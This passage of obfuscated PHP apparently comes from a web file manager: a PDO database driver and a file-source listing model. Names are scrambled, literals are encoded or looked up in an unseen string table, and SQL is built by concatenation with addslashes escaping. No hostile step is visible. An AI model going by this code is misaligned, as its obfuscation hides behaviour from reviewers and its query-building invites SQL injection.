!1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($ß õá¸ || preg_match($àä¢‡¦´[1053], $» €Š¨‹)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Œ´ş©ï„ = $this->_linkID->commit(); $this->transTimes = 0; if (!$Œ´ş©ï„) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $…¾¯·ñ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$…¾¯·ñ) { $this->error(); return !1; } } return !0; } private function getAll() { $ıÚâ†É° = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($ıÚâ†É°); return $ıÚâ†É°; } public function getFields($Éå£•íß) { $€Ê¨ÆúÕ =& $_SERVER[Ï×Œõ”û]; $this->initConnect(!0); if (think_config($€Ê¨ÆúÕ[1054])) { $¨ªš¢ãÕ = str_replace($€Ê¨ÆúÕ[1055], $Éå£•íß, think_config($€Ê¨ÆúÕ[1054])); } else { switch ($this->dbType) { case $€Ê¨ÆúÕ[1038]: case $€Ê¨ÆúÕ[1056]: $¨ªš¢ãÕ = "\123\105\x4c\105\103\x54\40\x20\40\143\x6f\x6c\165\x6d\x6e\x5f\156\x61\x6d\x65\40\x61\x73\x20\x27\x4e\x61\155\145\x27\54\40\x20\x20\144\141\164\x61\137\164\171\x70\x65\x20\141\x73\x20\47\x54\x79\160\x65\x27\54\40\x20\x20\x63\x6f\x6c\x75\155\156\137\144\x65\146\141\165\154\x74\x20\141\163\x20\47\104\x65\x66\x61\165\154\164\x27\x2c\x20\40\x20\x69\163\x5f\x6e\x75\154\x6c\x61\142\x6c\x65\40\141\x73\40\x27\116\165\154\154\x27\12\11\11\106\122\117\115\11\151\156\x66\x6f\162\x6d\141\x74\151\x6f\156\x5f\163\x63\x68\145\155\x61\x2e\x74\141\142\x6c\x65\x73\x20\x41\123\40\164\12\11\x9\x4a\117\x49\x4e\x9\x69\x6e\146\157\162\x6d\x61\164\x69\x6f\156\137\163\x63\x68\x65\x6d\x61\56\143\x6f\154\x75\x6d\156\163\40\101\123\40\x63\12\x9\11\x4f\x4e\40\x20\x74\x2e\x74\141\x62\x6c\145\x5f\143\x61\x74\x61\154\157\x67\40\x3d\40\143\x2e\164\141\x62\x6c\145\137\143\x61\x74\x61\x6c\x6f\x67\12\11\11\x41\116\104\x20\x74\56\164\x61\x62\154\x65\137\x73\143\x68\145\155\141\40\x3d\40\x63\56\164\141\142\154\x65\137\163\143\x68\145\155\141\xa\11\11\x41\x4e\x44\x20\x74\x2e\164\141\x62\x6c\145\137\x6e\141\155\145\40\x3d\40\x63\56\x74\141\142\154\x65\x5f\156\141\x6d\x65\xa\x9\x9\x57\110\105\122\x45\40\x20\40\x74\x2e\164\x61\142\154\x65\137\x6e\x61\x6d\x65\x20\75\x20\47{$Éå£•íß}\x27"; break; case $€Ê¨ÆúÕ[1057]: $¨ªš¢ãÕ = $€Ê¨ÆúÕ[1058] . $Éå£•íß . $€Ê¨ÆúÕ[1059]; break; case $€Ê¨ÆúÕ[1039]: case $€Ê¨ÆúÕ[1041]: $¨ªš¢ãÕ = $€Ê¨ÆúÕ[1060] . $€Ê¨ÆúÕ[1061] . $€Ê¨ÆúÕ[1062] . strtoupper($Éå£•íß) . $€Ê¨ÆúÕ[1063] . strtoupper($Éå£•íß) . $€Ê¨ÆúÕ[1064]; break; case $€Ê¨ÆúÕ[1065]: $¨ªš¢ãÕ = $€Ê¨ÆúÕ[1066] . $Éå£•íß . $€Ê¨ÆúÕ[1067]; break; case $€Ê¨ÆúÕ[1040]: break; case $€Ê¨ÆúÕ[1068]: default: $¨ªš¢ãÕ = $€Ê¨ÆúÕ[1069] . ($this->dbType == $€Ê¨ÆúÕ[1068] ? "\x60{$Éå£•íß}\x60" : $Éå£•íß); } } $‹ÁÄ»”º = $this->query($¨ªš¢ãÕ); $™Úİ”Î£ = array(); if ($‹ÁÄ»”º) { foreach ($‹ÁÄ»”º as $°¥Î¥Û¿ => $ĞúŞì²ç) { $ĞúŞì²ç = array_change_key_case($ĞúŞì²ç); $ĞúŞì²ç[$€Ê¨ÆúÕ[32]] = isset($ĞúŞì²ç[$€Ê¨ÆúÕ[32]]) ? $ĞúŞì²ç[$€Ê¨ÆúÕ[32]] : $€Ê¨ÆúÕ[464]; $ĞúŞì²ç[$€Ê¨ÆúÕ[33]] = isset($ĞúŞì²ç[$€Ê¨ÆúÕ[33]]) ? $ĞúŞì²ç[$€Ê¨ÆúÕ[33]] : $€Ê¨ÆúÕ[464]; $Ò¼éÏÖÃ = isset($ĞúŞì²ç[$€Ê¨ÆúÕ[353]]) ? $ĞúŞì²ç[$€Ê¨ÆúÕ[353]] : $ĞúŞì²ç[$€Ê¨ÆúÕ[32]]; $™Úİ”Î£[$Ò¼éÏÖÃ] = array($€Ê¨ÆúÕ[32] => $Ò¼éÏÖÃ, $€Ê¨ÆúÕ[33] => $ĞúŞì²ç[$€Ê¨ÆúÕ[33]], $€Ê¨ÆúÕ[35] => (bool) (isset($ĞúŞì²ç[$€Ê¨ÆúÕ[104]]) && $ĞúŞì²ç[$€Ê¨ÆúÕ[104]] === $€Ê¨ÆúÕ[12] || isset($ĞúŞì²ç[$€Ê¨ÆúÕ[35]]) && $ĞúŞì²ç[$€Ê¨ÆúÕ[35]] === $€Ê¨ÆúÕ[12]), $€Ê¨ÆúÕ[37] => isset($ĞúŞì²ç[$€Ê¨ÆúÕ[37]]) ? $ĞúŞì²ç[$€Ê¨ÆúÕ[37]] : (isset($ĞúŞì²ç[$€Ê¨ÆúÕ[56]]) ? $ĞúŞì²ç[$€Ê¨ÆúÕ[56]] : $€Ê¨ÆúÕ[464]), $€Ê¨ÆúÕ[39] => isset($ĞúŞì²ç[$€Ê¨ÆúÕ[95]]) ? strtolower($ĞúŞì²ç[$€Ê¨ÆúÕ[95]]) == $€Ê¨ÆúÕ[41] : (isset($ĞúŞì²ç[$€Ê¨ÆúÕ[57]]) ? $ĞúŞì²ç[$€Ê¨ÆúÕ[57]] : !1), $€Ê¨ÆúÕ[42] => isset($ĞúŞì²ç[$€Ê¨ÆúÕ[1070]]) ? strtolower($ĞúŞì²ç[$€Ê¨ÆúÕ[1070]]) == $€Ê¨ÆúÕ[44] : (isset($ĞúŞì²ç[$€Ê¨ÆúÕ[95]]) ? $ĞúŞì²ç[$€Ê¨ÆúÕ[95]] : !1)); } } return $™Úİ”Î£; } public function getTables($°æïù•ä = '') { $§š§„×Ù =& $_SERVER[Ï×Œõ”û]; if (think_config($§š§„×Ù[1071])) { $‡ş×ñË  = str_replace($§š§„×Ù[1072], $°æïù•ä, think_config($§š§„×Ù[1071])); } else { switch ($this->dbType) { case $§š§„×Ù[1039]: case $§š§„×Ù[1041]: $‡ş×ñË  = $§š§„×Ù[1073]; break; case $§š§„×Ù[1038]: case $§š§„×Ù[1056]: $‡ş×ñË  = $§š§„×Ù[1074]; break; case $§š§„×Ù[1065]: $‡ş×ñË  = $§š§„×Ù[1075]; break; case $§š§„×Ù[1040]: think_exception(think_lang($§š§„×Ù[1076]) . $§š§„×Ù[1077]); break; case $§š§„×Ù[1057]: $‡ş×ñË  = $§š§„×Ù[45] . $§š§„×Ù[46] . $§š§„×Ù[47]; break; case $§š§„×Ù[1068]: default: if (!empty($°æïù•ä)) { $‡ş×ñË  = $§š§„×Ù[1017] . $°æïù•ä . $§š§„×Ù[1018]; } else { $‡ş×ñË  = $§š§„×Ù[1019]; } } } $§ëŸëˆÈ = $this->query($‡ş×ñË ); $ÎâãÉ­ = array(); foreach ($§ëŸëˆÈ as $³Òó¢¨ => $ÑóÀ€¤¤) { $ÎâãÉ­[$³Òó¢¨] = current($ÑóÀ€¤¤); } return $ÎâãÉ­; } protected function parseLimit($Ï‰³»Ğ) { $±ø¶ğè£ =& $_SERVER[Ï×Œõ”û]; $í¬üÉ¶  = $±ø¶ğè£[12]; if (!empty($Ï‰³»Ğ)) { switch ($this->dbType) { case $±ø¶ğè£[1065]: case $±ø¶ğè£[1057]: $Ï‰³»Ğ = explode($±ø¶ğè£[50], $Ï‰³»Ğ); if (count($Ï‰³»Ğ) > 1) { $í¬üÉ¶  .= $±ø¶ğè£[51] . $Ï‰³»Ğ[1] . $±ø¶ğè£[52] . $Ï‰³»Ğ[0] . $±ø¶ğè£[53]; } else { $í¬üÉ¶  .= $±ø¶ğè£[51] . $Ï‰³»Ğ[0] . $±ø¶ğè£[53]; } break; case $±ø¶ğè£[1038]: case $±ø¶ğè£[1056]: break; case $±ø¶ğè£[1040]: break; case $±ø¶ğè£[1039]: case $±ø¶ğè£[1041]: break; case $±ø¶ğè£[1068]: default: $í¬üÉ¶  .= $±ø¶ğè£[51] . $Ï‰³»Ğ . $±ø¶ğè£[53]; } } return $í¬üÉ¶ ; } public function parseKey(&$¥èõ§¤, $»È‹âÌİ = true) { $¢óĞ‘á‚ =& $_SERVER[Ï×Œõ”û]; if ($»È‹âÌİ) { $¥èõ§¤ = $this->parseKeyCheck($¥èõ§¤); } if ($this->dbType == $¢óĞ‘á‚[1068]) { if ($¥èõ§¤ != $¢óĞ‘á‚[222] && !preg_match($¢óĞ‘á‚[1032], $¥èõ§¤)) { $¥èõ§¤ = $¢óĞ‘á‚[473] . trim($¥èõ§¤, $¢óĞ‘á‚[473]) . $¢óĞ‘á‚[473]; } return $¥èõ§¤; } else { return parent::parseKey($¥èõ§¤, $»È‹âÌİ); } } public function close() { $this->_linkID = null; } public function error() { $Ó¬ÆïúØ =& $_SERVER[Ï×Œõ”û]; if ($this->PDOStatement) { $Øâò¸š = $this->PDOStatement->errorInfo(); $this->error = $Øâò¸š[1] . $Ó¬ÆïúØ[4] . $Øâò¸š[2]; } else { $this->error = $Ó¬ÆïúØ[12]; } if ($Ó¬ÆïúØ[12] != $this->queryStr) { $this->error .= LNG($Ó¬ÆïúØ[48]) . $this->queryStr; } think_trace($this->error, $Ó¬ÆïúØ[12], $Ó¬ÆïúØ[49]); return $this->error; } public function escapeString($ò”€œô) { $õåÛÔº =& $_SERVER[Ï×Œõ”û]; switch ($this->dbType) { case $õåÛÔº[1065]: case $õåÛÔº[1038]: case $õåÛÔº[1056]: case $õåÛÔº[1068]: return addslashes($ò”€œô); case $õåÛÔº[1040]: case $õåÛÔº[1057]: case $õåÛÔº[1039]: case $õåÛÔº[1041]: return str_ireplace($õåÛÔº[58], $õåÛÔº[59], $ò”€œô); } } protected function parseValue($­«‚ŸÓã) { $…•¼Ú–± =& $_SERVER[Ï×Œõ”û]; if (is_string($­«‚ŸÓã)) { $¯ÕÑ€¡­ = strpos($­«‚ŸÓã, $…•¼Ú–±[4]) === 0 && in_array($­«‚ŸÓã, array_keys($this->bind)); $­«‚ŸÓã = $¯ÕÑ€¡­ ? $this->escapeString($­«‚ŸÓã) : $…•¼Ú–±[1078] . $this->escapeString($­«‚ŸÓã) . $…•¼Ú–±[1078]; } elseif (isset($­«‚ŸÓã[0]) && is_string($­«‚ŸÓã[0]) && strtolower($­«‚ŸÓã[0]) == $…•¼Ú–±[374]) { $­«‚ŸÓã = $this->escapeString($­«‚ŸÓã[1]); } elseif (is_array($­«‚ŸÓã)) { $­«‚ŸÓã = array_map(array($this, $…•¼Ú–±[1079]), $­«‚ŸÓã); } elseif (is_bool($­«‚ŸÓã)) { $­«‚ŸÓã = $­«‚ŸÓã ? $…•¼Ú–±[91] : $…•¼Ú–±[230]; } elseif (is_null($­«‚ŸÓã)) { $­«‚ŸÓã = $…•¼Ú–±[104]; } return $­«‚ŸÓã; } public function getLastInsertId() { $ ¨Òãë¶ =& $_SERVER[Ï×Œõ”û]; switch ($this->dbType) { case $ ¨Òãë¶[1065]: case $ ¨Òãë¶[1057]: case $ ¨Òãë¶[1038]: case $ ¨Òãë¶[1056]: case $ ¨Òãë¶[1040]: case $ ¨Òãë¶[1068]: return $this->_linkID->lastInsertId(); case $ ¨Òãë¶[1039]: case $ ¨Òãë¶[1041]: $­¢ù­ñ¨ = $this->table; $ÒéÔ˜’ = $this->query("\x53\x45\114\105\103\124\x20{$­¢ù­ñ¨}\x2e\x63\x75\162\x72\x76\141\154\40\143\165\162\x72\x76\141\x6c\x20\106\x52\117\x4d\40\144\165\141\154"); return $ÒéÔ˜’ ? $ÒéÔ˜’[0][$ ¨Òãë¶[1080]] : 0; } } } goto B‘ø˜ À³Ò; aëŞ¡´ùå–: class SourceListModel extends ModelBase { protected $tableName = "\151\157\x5f\x73\157\165\x72\143\x65"; protected $tableMeta = array("\164\141\142\x6c\145\x4e\141\155\x65" => "\x69\157\x5f\163\x6f\165\162\x63\x65\x5f\155\145\x74\x61", "\155\145\164\141\106\x69\145\x6c\x64" => "\163\157\x75\162\x63\x65\x49\104"); protected $dataAuto = array(array("\x6d\157\x64\x69\146\171\x54\151\155\145", "\x74\151\155\145", "\151\156\x73\x65\162\164", "\146\165\156\143\164\151\157\x6e"), array("\x63\x72\145\x61\164\145\x54\151\x6d\145", "\164\x69\x6d\x65", "\151\156\163\145\x72\x74", "\x66\x75\156\x63\x74\151\157\156"), array("\x76\x69\x65\x77\124\151\x6d\x65", "\x74\151\155\x65", "\151\156\163\x65\162\164", "\146\165\156\143\164\151\x6f\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($Ñ»ˆ‘‘ß) { return $this->listSource(array($_SERVER[Ï×Œõ”û][497] => $Ñ»ˆ‘‘ß)); } public function typeName($õÉğÃà›) { static $Úöšãø› = array(self::TYPE_SYSTEM => "\163\x79\x73\x74\x65\155", self::TYPE_USER => "\165\163\145\x72", self::TYPE_GROUP => "\147\162\x6f\x75\160"); return $Úöšãø›[$õÉğÃà› . $_SERVER[Ï×Œõ”û][12]]; } public function sourceListInfo($¨ôµÀÏë, $½Ê»­·À = false) { $ŸÊ¡Ô„­ =& $_SERVER[Ï×Œõ”û]; $¨ôµÀÏë = $¨ôµÀÏë ? $¨ôµÀÏë : array(); $¨ôµÀÏë = array_filter(array_unique($¨ôµÀÏë)); if (!$¨ôµÀÏë) { return array(); } $âÎà³¯„ = $this->where(array($ŸÊ¡Ô„­[193] => array($ŸÊ¡Ô„­[7], $¨ôµÀÏë)))->select(); $this->_listDataApply($âÎà³¯„, $½Ê»­·À); return array_to_keyvalue($âÎà³¯„, $ŸÊ¡Ô„­[193]); } public function pathInfoFilter(&$³ÈşùÂü) { $»—÷«¹ï =& $_SERVER[Ï×Œõ”û]; static $æşöÄÊÊ = false; static $¿ñ³«Œ¨ = false; static $ò­Êš–• = false; if (!$æşöÄÊÊ) { $¾½†ïŸù = $»—÷«¹ï[498]; $¾½†ïŸù .= $»—÷«¹ï[499]; $¾½†ïŸù .= $»—÷«¹ï[500]; $Ğ‘í×óõ = $»—÷«¹ï[501]; $êÆÏÓÏõ = explode($»—÷«¹ï[50], $Ğ‘í×óõ); $æşöÄÊÊ = explode($»—÷«¹ï[50], $¾½†ïŸù); $¿ñ³«Œ¨ = array(); foreach ($æşöÄÊÊ as $©â‘¸íµ) { if (in_array($©â‘¸íµ, $êÆÏÓÏõ)) { continue; } $¿ñ³«Œ¨[] = $©â‘¸íµ; } $ò­Êš–• = explode($»—÷«¹ï[50], $»—÷«¹ï[502]); } foreach ($ò­Êš–• as $ğÛ½çª—) { if (isset($³ÈşùÂü[$ğÛ½çª—])) { $³ÈşùÂü[$ğÛ½çª—] = intval($³ÈşùÂü[$ğÛ½çª—]); } } $³ÈşùÂü[$»—÷«¹ï[87]] = $»—÷«¹ï[503] . $³ÈşùÂü[$»—÷«¹ï[193]] . $»—÷«¹ï[504]; $³ÈşùÂü[$»—÷«¹ï[33]] = $³ÈşùÂü[$»—÷«¹ï[505]] == 1 ? $»—÷«¹ï[78] : $»—÷«¹ï[232]; $³ÈşùÂü[$»—÷«¹ï[190]] = $this->typeName($³ÈşùÂü[$»—÷«¹ï[190]]); if ($³ÈşùÂü[$»—÷«¹ï[505]] != 1) { $³ÈşùÂü[$»—÷«¹ï[168]] = $³ÈşùÂü[$»—÷«¹ï[506]]; unset($³ÈşùÂü[$»—÷«¹ï[506]]); } $±İ”ñÜÍ = $æşöÄÊÊ; if (isset($³ÈşùÂü[$»—÷«¹ï[507]]) && $³ÈşùÂü[$»—÷«¹ï[507]][$»—÷«¹ï[508]] == -1) { $±İ”ñÜÍ = $¿ñ³«Œ¨; } $³ÈşùÂü = array_field_key($³ÈşùÂü, $±İ”ñÜÍ); return $³ÈşùÂü; } public function listUserFav() { $Í”‹®ç« =& $_SERVER[Ï×Œõ”û]; $¶ŞˆÆÃ = Model($Í”‹®ç«[509])->listData(); $ÁõÂ³ØŠ = array_filter_by_field($¶ŞˆÆÃ, $Í”‹®ç«[33], $Í”‹®ç«[510]); $ÁõÂ³ØŠ = array_to_keyvalue($ÁõÂ³ØŠ, $Í”‹®ç«[12], $Í”‹®ç«[87]); if ($ÁõÂ³ØŠ) { $ò…ŠªËÀ = $this->listSource(array($Í”‹®ç«[511] => array($Í”‹®ç«[512], $ÁõÂ³ØŠ))); } $ò…ŠªËÀ = array_to_keyvalue($ò…ŠªËÀ[$Í”‹®ç«[447]], $Í”‹®ç«[193]); foreach ($¶ŞˆÆÃ as &$êÅÂøÜô) { $êÅÂøÜô = array($Í”‹®ç«[513] => $êÅÂøÜô[$Í”‹®ç«[484]], $Í”‹®ç«[514] => $êÅÂøÜô[$Í”‹®ç«[32]], $Í”‹®ç«[515] => $êÅÂøÜô[$Í”‹®ç«[87]], $Í”‹®ç«[516] => $êÅÂøÜô[$Í”‹®ç«[33]], $Í”‹®ç«[517] => $êÅÂøÜô[$Í”‹®ç«[233]], $Í”‹®ç«[518] => $êÅÂøÜô[$Í”‹®ç«[88]]); if ($êÅÂøÜô[$Í”‹®ç«[33]] == $Í”‹®ç«[510] && $ò…ŠªËÀ[$êÅÂøÜô[$Í”‹®ç«[87]]]) { $êÅÂøÜô[$Í”‹®ç«[90]] = $ò…ŠªËÀ[$êÅÂøÜô[$Í”‹®ç«[87]]]; } } unset($êÅÂøÜô); return $¶ŞˆÆÃ; } public function listUserTag($§ÈŞ¦ô) { $Ñî†¤ç¦ =& $_SERVER[Ï×Œõ”û]; if ($§ÈŞ¦ô && !is_array($§ÈŞ¦ô)) { $§ÈŞ¦ô = array($§ÈŞ¦ô); } $İÛ·Õ—ë = Model($Ñî†¤ç¦[519])->listData(); $ıò»â’³ = array(); $ˆµçğ–Ò = array(); foreach ($İÛ·Õ—ë as $ÌªğÒÇ) { $”°Â³èÎ = $ÌªğÒÇ[$Ñî†¤ç¦[87]]; if (!$”°Â³èÎ) { continue; } if (!isset($ˆµçğ–Ò[$”°Â³èÎ])) { $ˆµçğ–Ò[$”°Â³èÎ] = array(); } $ˆµçğ–Ò[$”°Â³èÎ][] = $ÌªğÒÇ[$Ñî†¤ç¦[520]]; $ıò»â’³[$ÌªğÒÇ[$Ñî†¤ç¦[87]]] = $ÌªğÒÇ; } $’ø›Ôõ´ = array(); $Ç·Õ§¹ù = array(); $ ˜ËìÅû = array(); foreach ($ˆµçğ–Ò as $•©„€Î => $¹ÍÈ´äå) { $³ÍÄàïô = !0; if (!$§ÈŞ¦ô) { $’ø›Ôõ´[] = $•©„€Î; continue; } foreach ($§ÈŞ¦ô as $ëô×å«) { if (!in_array($ëô×å«, $¹ÍÈ´äå)) { $³ÍÄàïô = !1; break; } } if (!$³ÍÄàïô) { continue; } if (!is_numeric($•©„€Î)) { $¡ Ïó¹Ï = $ıò»â’³[$•©„€Î]; $‰ÆÁÖ’ò = array($Ñî†¤ç¦[32] => $¡ Ïó¹Ï[$Ñî†¤ç¦[32]], $Ñî†¤ç¦[87] => $¡ Ïó¹Ï[$Ñî†¤ç¦[87]], $Ñî†¤ç¦[33] => $¡ Ïó¹Ï[$Ñî†¤ç¦[33]], $Ñî†¤ç¦[90] => array($Ñî†¤ç¦[521] => 1), $Ñî†¤ç¦[234] => !0); if ($¡ Ïó¹Ï[$Ñî†¤ç¦[33]] == $Ñî†¤ç¦[232]) { $ ˜ËìÅû[] = $‰ÆÁÖ’ò; } if ($¡ Ïó¹Ï[$Ñî†¤ç¦[33]] == $Ñî†¤ç¦[78]) { $Ç·Õ§¹ù[] = $‰ÆÁÖ’ò; } continue; } $’ø›Ôõ´[] = $•©„€Î; } if ($’ø›Ôõ´) { $ìÆ¸éåí = $this->listSource(array($Ñî†¤ç¦[511] => array($Ñî†¤ç¦[512], $’ø›Ôõ´))); } $ìÆ¸éåí = $ìÆ¸éåí ? $ìÆ¸éåí : array($Ñî†¤ç¦[85] => array(), $Ñî†¤ç¦[86] => array()); $ìÆ¸éåí[$Ñî†¤ç¦[85]] = array_merge($ìÆ¸éåí[$Ñî†¤ç¦[85]], $Ç·Õ§¹ù); $ìÆ¸éåí[$Ñî†¤ç¦[86]] = array_merge($ìÆ¸éåí[$Ñî†¤ç¦[86]], $ ˜ËìÅû); if (isset($ìÆ¸éåí[$Ñî†¤ç¦[444]]) && count($’ø›Ôõ´) == $ìÆ¸éåí[$Ñî†¤ç¦[444]][$Ñî†¤ç¦[445]]) { return $ìÆ¸éåí; } $İÓ…çöË = array(); $è‘®ó˜ = array_to_keyvalue($ìÆ¸éåí[$Ñî†¤ç¦[85]], $Ñî†¤ç¦[12], $Ñî†¤ç¦[193]); $º”á†ì£ = array_to_keyvalue($ìÆ¸éåí[$Ñî†¤ç¦[86]], $Ñî†¤ç¦[12], $Ñî†¤ç¦[193]); $Áß¹†Û = array_merge($º”á†ì£, $è‘®ó˜); foreach ($’ø›Ôõ´ as $”°Â³èÎ) { if (!in_array($”°Â³èÎ, $Áß¹†Û)) { $İÓ…çöË[] = $”°Â³èÎ; } } if ($İÓ…çöË) { Model($Ñî†¤ç¦[522])->removeBySource($İÓ…çöË); } return $ìÆ¸éåí; } public function listUserRecycle() { $ğŒ®ÇÅú =& $_SERVER[Ï×Œõ”û]; $‰È†À» = Model($ğŒ®ÇÅú[523])->listData(); if (!$‰È†À») { return array(); } $«“üÓ¿ = array($ğŒ®ÇÅú[511] => array($ğŒ®ÇÅú[512], $‰È†À»), $ğŒ®ÇÅú[524] => 1); return $this->listSource($«“üÓ¿); } public function listSource($ô±Â æÏ, $»‡‡ïóî = 3000, $à€î¯ = false) { $šÕ”œ× =& $_SERVER[Ï×Œõ”û]; if (!isset($ô±Â æÏ[$šÕ”œ×[525]])) { $ô±Â æÏ[$šÕ”œ×[525]] = 0; } if (isset($ô±Â æÏ[$šÕ”œ×[192]]) && $ô±Â æÏ[$šÕ”œ×[192]] == $šÕ”œ×[230]) { $ô±Â æÏ[$šÕ”œ×[506]] = array($šÕ”œ×[465], $šÕ”œ×[12]); } if (isset($ô±Â æÏ[$šÕ”œ×[192]])) { $ô±Â æÏ[$šÕ”œ×[192]] = intval($ô±Â æÏ[$šÕ”œ×[192]]); } $ğÈº©şµ = $šÕ”œ×[526]; $Ÿ°çó»Ì = $this->field($ğÈº©şµ)->_makeOrder()->where($ô±Â æÏ)->selectPage($»‡‡ïóî); $this->_listPageCheck($Ÿ°çó»Ì, $ğÈº©şµ, $ô±Â æÏ); $this->_listDataApply($Ÿ°çó»Ì[$šÕ”œ×[447]], $à€î¯); $this->_listMake($Ÿ°çó»Ì); return $Ÿ°çó»Ì; } private function _listPageCheck(&$Êü•¼¼«, $Ÿ§¸ëŸ, $ä–ûÃ¡) { $ÃîŒ°Ô =& $_SERVER[Ï×Œõ”û]; if (!is_array($Êü•¼¼«[$ÃîŒ°Ô[444]])) { return; } $—Œ¸…ö¥ = $Êü•¼¼«[$ÃîŒ°Ô[444]]; if ($—Œ¸…ö¥[$ÃîŒ°Ô[446]] <= 1) { return; } if ($—Œ¸…ö¥[$ÃîŒ°Ô[445]] >= 100000) { return; } if (Model($ÃîŒ°Ô[527])->get($ÃîŒ°Ô[528]) != $ÃîŒ°Ô[529]) { return; } $Ÿ§¸ëŸ = str_replace(array($ÃîŒ°Ô[53], $ÃîŒ°Ô[419], $ÃîŒ°Ô[287]), $ÃîŒ°Ô[12], $Ÿ§¸ëŸ); $Ÿ§¸ëŸ = $ÃîŒ°Ô[530] . str_replace($ÃîŒ°Ô[50], $ÃîŒ°Ô[531], $Ÿ§¸ëŸ) . $ÃîŒ°Ô[532]; $İá«ğº = $ÃîŒ°Ô[533]; $İá«ğº = $İá«ğº . $ÃîŒ°Ô[534]; $ŠñŞéÇ’ = $—Œ¸…ö¥[$ÃîŒ°Ô[441]] * ($—Œ¸…ö¥[$ÃîŒ°Ô[430]] - 1) . $ÃîŒ°Ô[50] . $—Œ¸…ö¥[$ÃîŒ°Ô[441]]; $ÉŠùÂñ = $this->_makeOrder(!0); $ÜÁÎ€× = $ÃîŒ°Ô[530] . str_replace($ÃîŒ°Ô[50], $ÃîŒ°Ô[531], $ÉŠùÂñ[0]); if (strpos($ÜÁÎ€×, $ÃîŒ°Ô[535])) { $ÜÁÎ€× = str_replace($ÃîŒ°Ô[535], $ÃîŒ°Ô[536], $ÜÁÎ€×); } else { $ÜÁÎ€× .= $ÃîŒ°Ô[537] . $ÉŠùÂñ[1]; } $öÖä›Ãê = array(); foreach ($ä–ûÃ¡ as $ıÁŠã¡Æ => $­µ‘¥Ë¢) { $öÖä›Ãê[$ÃîŒ°Ô[530] . $ıÁŠã¡Æ] = $­µ‘¥Ë¢; } $this->alias($ÃîŒ°Ô[538])->field($Ÿ§¸ëŸ)->limit($ŠñŞéÇ’)->order($ÜÁÎ€×); $¢€âÔ¼ğ = $this->join($İá«ğº)->where($öÖä›Ãê)->select(); if ($¢€âÔ¼ğ) { $Êü•¼¼«[$ÃîŒ°Ô[447]] = $¢€âÔ¼ğ; } } protected function _makeOrder($Ÿô÷Å“­ = false) { $ïÕ§Û£ =& $_SERVER[Ï×Œõ”û]; $úáµÅ“º = Model($ïÕ§Û£[539])->get($ïÕ§Û£[540]); $¯ô—ÕõÄ = Model($ïÕ§Û£[539])->get($ïÕ§Û£[541]); $şìéÉÎş = array($ïÕ§Û£[542] => $ïÕ§Û£[543], $ïÕ§Û£[544] => $ïÕ§Û£[545]); $Ô‰½§à‰ = array($ïÕ§Û£[32] => $ïÕ§Û£[32], $ïÕ§Û£[79] => $ïÕ§Û£[79], $ïÕ§Û£[168] => $ïÕ§Û£[506], $ïÕ§Û£[546] => $ïÕ§Û£[546], $ïÕ§Û£[547] => $ïÕ§Û£[548], $ïÕ§Û£[233] => $ïÕ§Û£[233], $ïÕ§Û£[88] => $ïÕ§Û£[88]); $¢ğ“ÑÑ = Input::get($ïÕ§Û£[549], $ïÕ§Û£[7], $úáµÅ“º, array_keys($Ô‰½§à‰)); $æŞìÕ°ó = Input::get($ïÕ§Û£[550], $ïÕ§Û£[7], $¯ô—ÕõÄ, array_keys($şìéÉÎş)); if (!in_array($¢ğ“ÑÑ, array_keys($Ô‰½§à‰))) { $¢ğ“ÑÑ = $ïÕ§Û£[32]; } if (!in_array($æŞìÕ°ó, array_keys($şìéÉÎş))) { $¢ğ“ÑÑ = $ïÕ§Û£[542]; } if ($¢ğ“ÑÑ == $ïÕ§Û£[32]) { } $—‚¨ÍõÆ = $ïÕ§Û£[551] . $Ô‰½§à‰[$¢ğ“ÑÑ] . $ïÕ§Û£[53] . $şìéÉÎş[$æŞìÕ°ó]; $—‚¨ÍõÆ = rtrim(trim($—‚¨ÍõÆ), $ïÕ§Û£[50]); if ($Ÿô÷Å“­) { return array($—‚¨ÍõÆ, $şìéÉÎş[$æŞìÕ°ó]); } return $this->order($—‚¨ÍõÆ); } protected function _listDataApplyItem($ ¿íÖ“Ï, $€Úûà = false) { $íÑ´Î°½ = array($ ¿íÖ“Ï); $this->_listDataApply($íÑ´Î°½, $€Úûà); return $íÑ´Î°½[0]; } protected function _listDataApply(&$¬‹®úöú, $êÒ½¨Ì¬ = false) { $øäì¬ğï =& $_SERVER[Ï×Œõ”û]; if (!$¬‹®úöú) { $¬‹®úöú = array(); return; } $ß²â­©° = array_to_keyvalue($¬‹®úöú, $øäì¬ğï[12], $øäì¬ğï[193]); $ß²â­©° = array_unique($ß²â­©°); $ß²â­©° = array_to_int($ß²â­©°); $this->_listSourceCache($¬‹®úöú); if (!$êÒ½¨Ì¬) { $this->_listAppendMeta($¬‹®úöú, $ß²â­©°); $this->_listAppendFileMeta($¬‹®úöú, $ß²â­©°); $this->_listAppendChildren($¬‹®úöú, $ß²â­©°); } $this->_listAppendPath($¬‹®úöú); $this->_listAppendAuth($¬‹®úöú); $this->_listAppendSourceInfo($¬‹®úöú, $ß²â­©°); $this->_listAppendUser($¬‹®úöú); $this->_listFilterInfo($¬‹®úöú, $êÒ½¨Ì¬); $this->_listAppendAuthSecret($¬‹®úöú); } protected function _listSourceCache($°ÕÙ•‹®) { $µßÖÇŠ“ =& $_SERVER[Ï×Œõ”û]; foreach ($°ÕÙ•‹® as $•’Îø­¨) { self::$cacheSourceInfo[$µßÖÇŠ“[552] . $•’Îø­¨[$µßÖÇŠ“[193]]] = $•’Îø­¨; } } protected function _listFilterInfo(&$‰¾áÌí­, $ÆıêÓÓ = false) { $õ½ÚÀ˜ =& $_SERVER[Ï×Œõ”û]; foreach ($‰¾áÌí­ as &$‰ú÷¶¥) { $‰ú÷¶¥ = $this->pathInfoFilter($‰ú÷¶¥); self::$cachePathInfo[$õ½ÚÀ˜[553] . intval($ÆıêÓÓ) . $õ½ÚÀ˜[474] . $‰ú÷¶¥[$õ½ÚÀ˜[193]]] = 